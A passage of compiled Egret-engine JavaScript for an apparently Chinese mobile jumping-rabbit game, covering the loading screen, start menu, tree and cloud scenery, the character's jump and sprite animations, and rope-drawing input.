			g.x = (c - f) / d.StageDelegate.getInstance().getScaleX();
			g.y = (e - h) / d.StageDelegate.getInstance().getScaleY();
			return g
		};
		return c
	}
	(d.TouchContext);
	d.HTML5TouchContext = e;
	e.prototype.__class__ = "egret.HTML5TouchContext"
})(egret || (egret = {}));
var __extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
}, jump;
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this)
		}
		__extends(c, d);
		c.prototype.onAddToStage = function (a) {
			this.urlloader = new egret.URLLoader;
			a = new egret.URLRequest;
			this.urlloader.dataFormat = egret.URLLoaderDataFormat.VARIABLES;
			a.url = "http://httpbin.org/user-agent";
			this.urlloader.load(a);
			this.urlloader.addEventListener(egret.Event.COMPLETE, this.onComplete, this)
		};
		c.prototype.onComplete = function (a) {
			console.log(this.urlloader.data.toString())
		};
		return c
	}
	(egret.DisplayObjectContainer);
	d.NetDemo = e;
	e.prototype.__class__ = "jump.NetDemo"
})(jump || (jump = {}));
var __extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
}, LoadingUI = function (d) {
	function e() {
		d.call(this);
		this.hint = "\u840c\u840c\u8df3\u8df3\u5154\u52a0\u8f7d\u4e2d...\n \u5f00\u59cb\u754c\u9762\u8bf7\u5728\u624b\u6307\u63d0\u793a\u5904\u5212\u7ef3\u5b50\n \u7ef3\u5b50\u8d8a\u77ed\u5154\u5b50\u8df3\u5f97\u8d8a\u9ad8\n \n \u969c\u788d\u7269\u6709\u6811\u679d\u548c\u5929\u5175,\u4f60\u5c0f\u5fc3\u55bd\n \u9ad8\u5ea6\u8d8a\u9ad8\u98ce\u666f\u8d8a\u597d,\u597d\u4e1c\u897f\u90fd\u5728\u540e\u9762\n \u7cbe\u5f69\u5373\u5c06\u5f00\u59cb...\n".split(" ");
		this.hint_index =
			0;
		this.createView()
	}
	__extends(e, d);
	e.prototype.createView = function () {
		this.textField = new egret.TextField;
		this.addChild(this.textField);
		this.textField.y = 300;
		this.textField.width = 480;
		this.textField.height = 100;
		this.textField.textAlign = "center"
	};
	e.prototype.setProgress = function (d, c) {
		d == c - 1 ? this.hint_index = this.hint.length - 1 : (this.hint_index = d - 1, this.hint_index %= this.hint.length);
		this.textField.text = this.hint[this.hint_index] + "\u52a0\u8f7d\u4e2d..." + d + "/" + c
	};
	return e
}
(egret.Sprite);
LoadingUI.prototype.__class__ = "LoadingUI";
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
			this.addEventListener(egret.Event.REMOVED_FROM_STAGE, this.remove_face, this)
		}
		__extends(c, e);
		c.prototype.onAddToStage = function () {
			this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
			this.init_title();
			this.init_ranking();
			this.init_hint();
			this.init_sign();
			this.init_hand()
		};
		c.prototype.init_title = function () {
			this.title = new egret.Bitmap(GameApp.other_sheet.getTexture("title"));
			this.title.anchorX = 0.5;
			this.title.x = this.stage.stageWidth / 2;
			this.title.y = this.stage.stageHeight / 5;
			this.addChild(this.title)
		};
		c.prototype.init_ranking = function () {
			this.ranking = new egret.Bitmap(GameApp.other_sheet.getTexture("ranking"));
			this.ranking.anchorX = 0.5;
			this.ranking.anchorY = 0.5;
			this.ranking.x = this.stage.stageWidth / 2;
			this.ranking.y = 27 * this.stage.stageHeight / 60;
			this.addChild(this.ranking);
			this.ranking.touchEnabled = !0;
			this.ranking.addEventListener(egret.TouchEvent.TOUCH_TAP, this.open_rangking, this)
		};
		c.prototype.open_rangking = function () {
			dp_Ranking();
		};
		c.prototype.back_face = function () {
			this.removeChildren();
			this.init_title();
			this.init_ranking();
			this.init_hint();
			this.init_sign();
			this.init_hand()
		};
		c.prototype.init_hint = function () {
			this.hint = new egret.Bitmap(GameApp.other_sheet.getTexture("hint"));
			this.hint.anchorX = 0.5;
			this.hint.x = this.stage.stageWidth / 2;
			this.hint.y = 8 * this.stage.stageHeight / 15;
			this.addChild(this.hint)
		};
		c.prototype.init_sign = function () {
			this.sign = new egret.Bitmap(GameApp.other_sheet.getTexture("sign"));
			this.sign.anchorX = 0.5;
			this.sign.x = this.stage.stageWidth / 2;
			this.sign.y = 13 * this.stage.stageHeight / 15;
			this.sign.touchEnabled = !0;
			this.addChild(this.sign);
			this.sign.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.rm_face, this)
		};
		c.prototype.rm_face = function () {
			this.sign.removeEventListener(egret.TouchEvent.TOUCH_BEGIN,
				this.rm_face, this);
			this.dispatchEventWith("rmface")
		};
		c.prototype.init_hand = function () {
			this.hand = new egret.Bitmap(GameApp.other_sheet.getTexture("hand"));
			this.hand.x = this.stage.stageWidth / 2 - 7 * this.sign.width / 16;
			this.hand.y = 13 * this.stage.stageHeight / 15 + this.sign.height / 2;
			this.addChild(this.hand);
			this.hand.touchEnabled = !0;
			this.hand.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.rm_face, this);
			this.start_move()
		};
		c.prototype.getspeedOffset = function () {
			var a = egret.getTimer(),
			b = 1E3 / (a - this._lastTime);
			this._lastTime = a;
			this.speedOffset = 60 / b
		};
		c.prototype.start_move = function () {
			this.hand.addEventListener(egret.Event.ENTER_FRAME, this.hand_move, this)
		};
		c.prototype.stop_move = function () {
			this.hand.removeEventListener(egret.Event.ENTER_FRAME, this.hand_move, this);
			this.hand.removeEventListener(egret.Event.ENTER_FRAME, this.hand_move_2, this)
		};
		c.prototype.hand_move = function () {
			this.hand.x >= this.stage.stageWidth / 2 + 3 * this.sign.width / 8 ? (this.hand.removeEventListener(egret.Event.ENTER_FRAME, this.hand_move, this), this.hand.addEventListener(egret.Event.ENTER_FRAME,
					this.hand_move_2, this)) : this.hand.x += 8
		};
		c.prototype.hand_move_2 = function () {
			this.hand.x <= this.stage.stageWidth / 2 - 7 * this.sign.width / 16 ? (this.hand.removeEventListener(egret.Event.ENTER_FRAME, this.hand_move_2, this), this.hand.addEventListener(egret.Event.ENTER_FRAME, this.hand_move, this)) : this.hand.x -= 8
		};
		c.prototype.remove_face = function () {
			this.stop_move();
			this.removeEventListener(egret.Event.REMOVED_FROM_STAGE, this.remove_face, this);
			this.ranking.removeEventListener(egret.TouchEvent.TOUCH_TAP, this.open_rangking,
				this);
			this.hand.removeEventListener(egret.Event.ENTER_FRAME, this.hand_move, this);
			this.sign.removeEventListener(egret.TouchEvent.TOUCH_BEGIN, this.rm_face, this)
		};
		return c
	}
	(egret.DisplayObjectContainer);
	d.StartFace = e;
	e.prototype.__class__ = "jump.StartFace"
})(jump || (jump = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this.have_tree = !1;
			this.winwidth = egret.MainContext.instance.stage.stageWidth;
			this.winheight = egret.MainContext.instance.stage.stageHeight;
			this.is_out = !1;
			this.init_trees()
		}
		__extends(c, d);
		c.prototype.init_trees = function () {
			this.trees_texture = [];
			this.trees_texture[0] = GameApp.cloud_tree_line_sheet.getTexture("tree0");
			this.trees_texture[1] = GameApp.cloud_tree_line_sheet.getTexture("tree-0");
			this.trees_texture[2] = GameApp.cloud_tree_line_sheet.getTexture("tree1");
			this.trees_texture[3] = GameApp.cloud_tree_line_sheet.getTexture("tree-1");
			this.trees = [];
			for (var a = 0; 6 > a; a++) {
				var b = Math.max(Math.ceil(4 * Math.random()) - 1, 0),
				c = new egret.Bitmap(this.trees_texture[b]);
				c.x = 0 == b || 2 == b ? -10 : this.winwidth - c.width + 15;
				c.y = 0 - c.height;
				this.addChild(c);
				this.trees.push(c)
			}
		};
		c.prototype.out_screen = function () {
			this.is_out = this.trees[0].y > this.winheight ? !0 : !1
		};
		return c
	}
	(egret.DisplayObjectContainer);
	d.Tree = e;
	e.prototype.__class__ = "jump.Tree"
})(jump || (jump = {}));
var __extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
}, GameApp = function (d) {
	function e() {
		d.call(this);
		this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this)
	}
	__extends(e, d);
	e.prototype.onAddToStage = function (d) {
		this.loadingView = new LoadingUI;
		this.stage.addChild(this.loadingView);
		RES.addEventListener(RES.ResourceEvent.CONFIG_COMPLETE, this.onConfigComplete, this);
		RES.loadConfig("resource/resource.json",
			"resource/")
	};
	e.prototype.onConfigComplete = function (d) {
		RES.removeEventListener(RES.ResourceEvent.CONFIG_COMPLETE, this.onConfigComplete, this);
		RES.addEventListener(RES.ResourceEvent.GROUP_COMPLETE, this.onResourceLoadComplete, this);
		RES.addEventListener(RES.ResourceEvent.GROUP_PROGRESS, this.onResourceProgress, this);
		RES.loadGroup("preload")
	};
	e.prototype.onResourceLoadComplete = function (d) {
		"preload" == d.groupName && (this.stage.removeChild(this.loadingView), RES.removeEventListener(RES.ResourceEvent.GROUP_COMPLETE,
				this.onResourceLoadComplete, this), RES.removeEventListener(RES.ResourceEvent.GROUP_PROGRESS, this.onResourceProgress, this), e.bigmap_sheet = RES.getRes("bigmap_json"), e.cloud_tree_line_sheet = RES.getRes("cloud_tree_line_json"), e.enemy_sprint_json = RES.getRes("enemy_sprint_json"), e.other_sheet = RES.getRes("other_json"), e.dead_json_sheet = RES.getRes("dead_json"), e.drop_json_sheet = RES.getRes("drop_json"), e.original_json_sheet = RES.getRes("original_json"), e.roll_json_sheet = RES.getRes("roll_json"), e.vjump_json_sheet =
				RES.getRes("vjump_json"), e.skew_json_sheet = RES.getRes("skew_json"), e.sprint_json_sheet = RES.getRes("sprint_json"), d = new jump.GameContainer, this.addChild(d), egret.Profiler.getInstance().run())
	};
	e.prototype.web_net = function () {
		this.test_net = new jump.NetDemo;
		this.addChild(this.test_net)
	};
	e.prototype.onResourceProgress = function (d) {
		"preload" == d.groupName && this.loadingView.setProgress(d.itemsLoaded, d.itemsTotal)
	};
	return e
}
(egret.DisplayObjectContainer);
GameApp.prototype.__class__ = "GameApp";
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c(a) {
			d.call(this);
			this.is_out = !1;
			this.cloud_speed = 0;
			this.texture = a;
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.set_xy, this)
		}
		__extends(c, d);
		c.prototype.set_xy = function () {
			this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.set_xy, this);
			this.anchorX = 0.5;
			this.x = Math.ceil(Math.random() * this.stage.stageWidth)
		};
		c.prototype.out_screen = function () {
			this.y > egret.MainContext.instance.stage.stageHeight && (this.is_out = !0)
		};
		c.prototype.set_speed = function (a) {
			this.cloud_speed =
				a
		};
		c.prototype.cloud_run = function () {
			this.y = this.y + this.cloud_speed + 0.5;
			this.cloud_speed = 0;
			this.out_screen()
		};
		return c
	}
	(egret.Bitmap);
	d.Cloud = e;
	e.prototype.__class__ = "jump.Cloud"
})(jump || (jump = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.is_hitwall = !1;
			this.sprint_index = this.left_right = 0;
			this.hight_best = egret.MainContext.instance.stage.stageHeight / 8 * 3;
			this.stage_hight = egret.MainContext.instance.stage.stageHeight;
			this.i = 1;
			this.hit_wall_index = 0;
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this)
		}
		__extends(c, e);
		c.prototype.onAddToStage = function (a) {
			this.leader_state = 1;
			this.bmp = new egret.Bitmap(GameApp.original_json_sheet.getTexture("original6"));
			this.stageW =
				egret.MainContext.instance.stage.stageWidth;
			this.stageH = egret.MainContext.instance.stage.stageHeight;
			this.bmp.anchorX = 0.5;
			this.bmp.anchorY = 0.5;
			this.bmp.scaleX = 2 / 3;
			this.bmp.scaleY = 2 / 3;
			this.bmp.x = this.stageW / 2;
			this.bmp.y = this.stageH - this.bmp.height / 2 / 2 - 300 - 10;
			this.v = this.stage_hight / 800 * 5;
			this.reduce_v = 0.4 * this.stage_hight / 800;
			this.ang = 90;
			this.up_down = 1;
			this.index = 0;
			this.addChild(this.bmp);
			this.addEventListener(egret.Event.ENTER_FRAME, this.init_run, this);
			this.init_wave()
		};
		c.prototype.init_wave = function () {
			this.sprint_bmp =
				new egret.Bitmap;
			this.addChild(this.sprint_bmp);
			this.sprint_bmp.anchorX = 0.5;
			this.sprint_bmp.anchorY = 0.5;
			this.sprint_bmp.scaleX = 2 / 3;
			this.sprint_bmp.scaleY = 2 / 3;
			this.sprint_bmp.visible = !1
		};
		c.prototype.sprint_wave = function () {
			this.sprint_index %= 24;
			switch (this.sprint_index) {
			case 0:
				this.sprint_bmp.texture = GameApp.enemy_sprint_json.getTexture("shockwave1");
				break;
			case 6:
				this.sprint_bmp.texture = GameApp.enemy_sprint_json.getTexture("shockwave2");
				break;
			case 12:
				this.sprint_bmp.texture = GameApp.enemy_sprint_json.getTexture("shockwave3");
				break;
			case 18:
				this.sprint_bmp.texture = GameApp.enemy_sprint_json.getTexture("shockwave4")
			}
			this.sprint_bmp.x = this.bmp.x;
			this.sprint_bmp.y = this.bmp.y;
			this.sprint_bmp.visible = !0;
			this.sprint_index++
		};
		c.prototype.play_wave = function () {
			this.addEventListener(egret.Event.ENTER_FRAME, this.sprint_wave, this)
		};
		c.prototype.stop_wave = function () {
			this.removeEventListener(egret.Event.ENTER_FRAME, this.sprint_wave, this);
			this.sprint_bmp.visible = !1
		};
		c.prototype.getspeedOffset = function () {
			var a = egret.getTimer(),
			b = 1E3 / (a -
					this._lastTime);
			this._lastTime = a;
			this.speedOffset = 60 / b
		};
		c.prototype.init_run = function (a) {
			if (1 == this.leader_state)
				this.bmp.y <= this.stage_hight - this.bmp.height / 2 / 2 - this.hight_best - 10 && 2 != this.up_down && (this.up_down = 2, this.v = 5 * this.stage_hight / 800, this.reduce_v = 0.4 * this.stage_hight / 800, this.ang = 90, this.bmp.texture = GameApp.original_json_sheet.getTexture("original6")), this.bmp.y >= this.stage_hight - this.bmp.height / 2 / 2 - 10 && 1 != this.up_down && (this.up_down = 1, this.v = 18 * this.stage_hight / 800, this.reduce_v = -0.4 *
						this.stage_hight / 800, this.ang = -90, this.bmp.texture = GameApp.original_json_sheet.getTexture("original10")), 1 == this.up_down ? this.bmp.y <= this.stageH - this.bmp.height / 2 / 2 - 9 * this.hight_best / 10 ? this.bmp.texture = GameApp.original_json_sheet.getTexture("original5") : this.bmp.y <= this.stageH - this.bmp.height / 2 / 2 - 8 * this.hight_best / 10 ? this.bmp.texture = GameApp.original_json_sheet.getTexture("original4") : this.bmp.y <= this.stageH - this.bmp.height / 2 / 2 && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original1-3")) :
					2 == this.up_down && this.bmp.y >= this.stageH - this.bmp.height / 2 / 2 - this.hight_best - 3 && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original7-9")), this.v += this.reduce_v, this.bmp.y += this.v * Math.sin(this.ang / 180 * Math.PI);
			else if (2 == this.leader_state) {
				0 == this.up_down && (this.up_down = 1);
				if (1 == this.up_down)
					if (this.is_hitwall)
						this.roll(), 19 == this.hit_wall_index && (this.is_hitwall = !1), this.stop_wave(), d.GameContainer.is_sprint = !1;
					else if (this.v > 2 * d.GameContainer.wave_v / 3 && !0 == d.GameContainer.is_sprint ?
						this.play_wave() : this.v < d.GameContainer.wave_v / 3 && this.stop_wave(), 1 == this.left_right) {
						if (this.v < d.GameContainer.ov - 3 * d.GameContainer.speed_reduce) {
							if (2 == d.GameContainer.rise_state)
								switch (a = 1, this.index %= 8 * a, this.index) {
								case 0 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint1");
									break;
								case 1 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint2");
									break;
								case 2 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint3");
									break;
								case 3 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint4");
									break;
								case 4 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint5");
									break;
								case 5 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint6");
									break;
								case 6 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint7");
									break;
								case 7 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint8")
								}
							else if (this.i = Math.max(Math.ceil((d.GameContainer.ov - this.v) / 8), 2), this.index %= 4 * this.i, 1 == d.GameContainer.rise_state)
								switch (this.index) {
								case 0 * this.i:
									this.bmp.texture = GameApp.vjump_json_sheet.getTexture("vjump-1");
									break;
								case 1 * this.i:
									this.bmp.texture = GameApp.vjump_json_sheet.getTexture("vjump-2");
									break;
								case 2 * this.i:
									this.bmp.texture = GameApp.vjump_json_sheet.getTexture("vjump-3");
									break;
								case 3 * this.i:
									this.bmp.texture = GameApp.vjump_json_sheet.getTexture("vjump-4")
								}
							else
								switch (this.index) {
								case 0 * this.i:
									this.bmp.texture = GameApp.skew_json_sheet.getTexture("skewjump-1");
									break;
								case 1 * this.i:
									this.bmp.texture = GameApp.skew_json_sheet.getTexture("skewjump-2");
									break;
								case 2 * this.i:
									this.bmp.texture = GameApp.skew_json_sheet.getTexture("skewjump-3");
									break;
								case 3 * this.i:
									this.bmp.texture = GameApp.skew_json_sheet.getTexture("skewjump-4")
								}
							this.index++
						}
						this.v < 29 * d.GameContainer.speed_reduce && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original-1-3"));
						this.v < 21 * d.GameContainer.speed_reduce && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original-4"));
						this.v < 13 * d.GameContainer.speed_reduce && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original-5"));
						this.v < 5 * d.GameContainer.speed_reduce && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original-6"))
					} else {
						if (this.v <
							d.GameContainer.ov - 3 * d.GameContainer.speed_reduce) {
							if (2 == d.GameContainer.rise_state)
								switch (a = 1, this.index %= 8 * a, this.index) {
								case 0 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint1");
									break;
								case 1 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint2");
									break;
								case 2 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint3");
									break;
								case 3 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint4");
									break;
								case 4 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint5");
									break;
								case 5 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint6");
									break;
								case 6 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint7");
									break;
								case 7 * a:
									this.bmp.texture = GameApp.sprint_json_sheet.getTexture("sprint8")
								}
							else if (this.i = Math.max(Math.ceil((d.GameContainer.ov - this.v) / 8), 2), this.index %= 4 * this.i, -1 == d.GameContainer.rise_state)
								switch (this.index) {
								case 0 * this.i:
									this.bmp.texture = GameApp.vjump_json_sheet.getTexture("vjump1");
									break;
								case 1 * this.i:
									this.bmp.texture = GameApp.vjump_json_sheet.getTexture("vjump2");
									break;
								case 2 * this.i:
									this.bmp.texture = GameApp.vjump_json_sheet.getTexture("vjump3");
									break;
								case 3 * this.i:
									this.bmp.texture = GameApp.vjump_json_sheet.getTexture("vjump4")
								}
							else
								switch (this.index) {
								case 0 * this.i:
									this.bmp.texture = GameApp.skew_json_sheet.getTexture("skewjump1");
									break;
								case 1 * this.i:
									this.bmp.texture = GameApp.skew_json_sheet.getTexture("skewjump2");
									break;
								case 2 * this.i:
									this.bmp.texture = GameApp.skew_json_sheet.getTexture("skewjump3");
									break;
								case 3 * this.i:
									this.bmp.texture = GameApp.skew_json_sheet.getTexture("skewjump4")
								}
							this.index++
						}
						this.v <
						29 * d.GameContainer.speed_reduce && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original1-3"));
						this.v < 21 * d.GameContainer.speed_reduce && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original4"));
						this.v < 13 * d.GameContainer.speed_reduce && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original5"));
						this.v < 5 * d.GameContainer.speed_reduce && (this.bmp.texture = GameApp.original_json_sheet.getTexture("original6"))
					}
				if (2 == this.up_down && (this.v += 0.5, 0 < this.v)) {
					this.i = Math.max(Math.ceil((d.GameContainer.ov -
									this.v) / 8), 15);
					this.index %= 4 * this.i;
					if (1 == this.left_right)
						switch (this.index) {
						case 0 * this.i:
							this.bmp.texture = GameApp.drop_json_sheet.getTexture("drop-1");
							break;
						case 1 * this.i:
							this.bmp.texture = GameApp.drop_json_sheet.getTexture("drop-2");
							break;
						case 2 * this.i:
							this.bmp.texture = GameApp.drop_json_sheet.getTexture("drop-3");
							break;
						case 3 * this.i:
							this.bmp.texture = GameApp.drop_json_sheet.getTexture("drop-2")
						}
					else
						switch (this.index) {
						case 0 * this.i:
							this.bmp.texture = GameApp.drop_json_sheet.getTexture("drop1");
							break;
						case 1 * this.i:
							this.bmp.texture = GameApp.drop_json_sheet.getTexture("drop2");
							break;
						case 2 * this.i:
							this.bmp.texture = GameApp.drop_json_sheet.getTexture("drop3");
							break;
						case 3 * this.i:
							this.bmp.texture = GameApp.drop_json_sheet.getTexture("drop2")
						}
					this.index++
				}
				this.bmp.x > this.stageW - this.bmp.width / 4 && 2 != this.left_right && (d.GameContainer.rise_state = 0 - d.GameContainer.rise_state, this.is_hitwall = !0, this.left_right = 2, this.ang = 180 - this.ang);
				this.bmp.x < this.bmp.width / 4 && 1 != this.left_right && (d.GameContainer.rise_state =
						0 - d.GameContainer.rise_state, this.is_hitwall = !0, this.left_right = 1, this.ang = 180 - this.ang);
				this.bmp.x += this.v * Math.cos(this.ang / 180 * Math.PI);
				this.bg_is_run || (this.bmp.y += this.v * Math.sin(this.ang / 180 * Math.PI))
			} else {
				this.stop_wave();
				d.GameContainer.is_sprint = !1;
				this.index %= 20;
				if (1 == this.left_right)
					switch (this.index) {
					case 0:
						this.bmp.texture = GameApp.dead_json_sheet.getTexture("dead1");
						break;
					case 5:
						this.bmp.texture = GameApp.dead_json_sheet.getTexture("dead2");
						break;
					case 10:
						this.bmp.texture = GameApp.dead_json_sheet.getTexture("dead3");
						break;
					case 15:
						this.bmp.texture = GameApp.dead_json_sheet.getTexture("dead4")
					}
				else
					switch (this.index) {
					case 0:
						this.bmp.texture = GameApp.dead_json_sheet.getTexture("dead-1");
						break;
					case 5:
						this.bmp.texture = GameApp.dead_json_sheet.getTexture("dead-2");
						break;
					case 10:
						this.bmp.texture = GameApp.dead_json_sheet.getTexture("dead-3");
						break;
					case 15:
						this.bmp.texture = GameApp.dead_json_sheet.getTexture("dead-4")
					}
				this.bmp.y += 10;
				this.index++
			}
			this.bmp.y > this.stageH + this.bmp.height && (this.removeEventListener(egret.Event.ENTER_FRAME,
					this.init_run, this), this.stop_wave(), this.dispatchEventWith("GAMEOVER"))
		};
		c.prototype.roll = function () {
			this.hit_wall_index %= 19;
			if (1 == this.left_right)
				switch (this.hit_wall_index) {
				case 0:
					this.bmp.texture = GameApp.roll_json_sheet.getTexture("roll1");
					break;
				case 5:
					this.bmp.texture = GameApp.roll_json_sheet.getTexture("roll2");
					break;
				case 10:
					this.bmp.texture = GameApp.roll_json_sheet.getTexture("roll3");
					break;
				case 15:
					this.bmp.texture = GameApp.roll_json_sheet.getTexture("roll4")
				}
			else
				switch (this.hit_wall_index) {
				case 0:
					this.bmp.texture =
						GameApp.roll_json_sheet.getTexture("roll-1");
					break;
				case 5:
					this.bmp.texture = GameApp.roll_json_sheet.getTexture("roll-2");
					break;
				case 10:
					this.bmp.texture = GameApp.roll_json_sheet.getTexture("roll-3");
					break;
				case 15:
					this.bmp.texture = GameApp.roll_json_sheet.getTexture("roll-4")
				}
			this.hit_wall_index++
		};
		return c
	}
	(egret.DisplayObjectContainer);
	d.Leader = e;
	e.prototype.__class__ = "jump.Leader"
})(jump || (jump = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.winwidth = egret.MainContext.instance.stage.stageWidth;
			this.winheight = egret.MainContext.instance.stage.stageHeight;
			this.line_sound = !1;
			this.temp_r = 0;
			this.a_run = 1;
			this.timer = new egret.Timer(200, 1);
			this.timer1 = new egret.Timer(10, 1);
			this.tree_index = this.enemy_num = 0;
			this.launcher_h = 2 * this.winheight / 5;
			this.launcher_v = 2 * this.winheight / 25;
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this)
		}
		__extends(c, e);
		c.prototype.onAddToStage =
		function () {
			this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
			this.createGameScene()
		};
		c.prototype.createGameScene = function () {
			this.bg = new d.BgMap;
			this.addChild(this.bg);
			this.enemy = [];
			this.addEventListener(egret.Event.ENTER_FRAME, this.remove_enemy, this);
			this.tree = new d.Tree;
			this.addChild(this.tree);
			this.leader = new d.Leader;
			this.addChild(this.leader);
			d.GameContainer.get_wave_v();
			this.init_start_face();
			this.init_line();
			this.score = new d.Score; 
			/*WeixinApi.ready(function (a) {
				var b =
					new WeixinShareInfo;
				b.title = "\u5ae6\u5a25\u4e3a\u4ec0\u4e48\u4e0d\u559c\u6b22\u732a\u516b\u6212,\u539f\u6765\u662f\u56e0\u4e3aTA";
				b.desc = "\u8f7b\u677e\u8df3\u5230" + d.GameContainer.best_score + "\u7c73";
				b.link = "http://42.121.113.35/test/test/index.html";
				a.shareToFriend(b);
				a.shareToTimeline(b)
			})*/
		};
		c.prototype.init_line = function () {
			this.line = new egret.Bitmap;
			this.line.anchorY = 0.5;
			this.line.visible = !1;
			this.addChild(this.line);
			this.rp = new egret.Bitmap(GameApp.cloud_tree_line_sheet.getTexture("p"));
			this.lp =
				new egret.Bitmap(GameApp.cloud_tree_line_sheet.getTexture("p"));
			this.rp.anchorX = 0.5;
			this.rp.anchorY = 0.5;
			this.rp.scaleX = 0.5;
			this.rp.scaleY = 0.5;
			this.lp.anchorX = 0.5;
			this.lp.anchorY = 0.5;
			this.lp.scaleX = 0.5;
			this.lp.scaleY = 0.5;
			this.rp.visible = !1;
			this.lp.visible = !1;
			this.addChild(this.rp);
			this.addChild(this.lp)
		};
		c.prototype.draw_line = function (a) {
			a.type == egret.TouchEvent.TOUCH_BEGIN && (this.removeEventListener(egret.Event.ENTER_FRAME, this.lx_hitTest, this), this.line.texture = GameApp.cloud_tree_line_sheet.getTexture("line1"),
				this.line.x = a.stageX, this.line.y = a.stageY, this.lp.x = a.stageX, this.lp.y = a.stageY, this.lp.visible = !0, this.rp.visible = !1, this.line.scaleX = 0, this.line.visible = !0, this.addEventListener(egret.TouchEvent.TOUCH_MOVE, this.draw_line, this));
			a.type == egret.TouchEvent.TOUCH_MOVE && (this.temp_r = Math.sqrt((a.stageX - this.line.x) * (a.stageX - this.line.x) + (a.stageY - this.line.y) * (a.stageY - this.line.y)), this.line.rotation = 180 / Math.PI * Math.atan2(a.stageY - this.line.y, a.stageX - this.line.x), this.temp_r < this.winwidth / 2 ? (this.rp.x =
						a.stageX, this.rp.y = a.stageY) : (this.temp_r = this.winwidth / 2, this.rp.x = this.line.x + this.temp_r * Math.cos(this.line.rotation / 180 * Math.PI), this.rp.y = this.line.y + this.temp_r * Math.sin(this.line.rotation / 180 * Math.PI)), this.line.scaleX = this.temp_r / this.line.width, this.rp.visible = !0);
			a.type == egret.TouchEvent.TOUCH_END && (this.removeEventListener(egret.TouchEvent.TOUCH_MOVE, this.draw_line, this), 0 < this.temp_r && (a = 1 / Math.ceil(20 * this.temp_r / egret.MainContext.instance.stage.stageHeight) * egret.MainContext.instance.stage.stageHeight *
						3.5, d.GameContainer.ov = this.f_run(a), a > 0.75 * egret.MainContext.instance.stage.stageHeight && (d.GameContainer.is_sprint = !0), d.GameContainer.speed_reduce = this.a_run, this.addEventListener(egret.Event.ENTER_FRAME, this.lx_hitTest, this)))
		};
		c.get_wave_v = function () {
			var a = Math.sqrt(2 * (1 / Math.ceil(20 / egret.MainContext.instance.stage.stageHeight)) * egret.MainContext.instance.stage.stageHeight * 3.5);
			d.GameContainer.wave_v = a
		};
		c.prototype.f_run = function (a) {
			return Math.sqrt(2 * this.a_run * a)
		};
		c.prototype.f_v = function (a) {
			return a -
			this.a_run
		};
		c.prototype.lx_hitTest = function (a) {
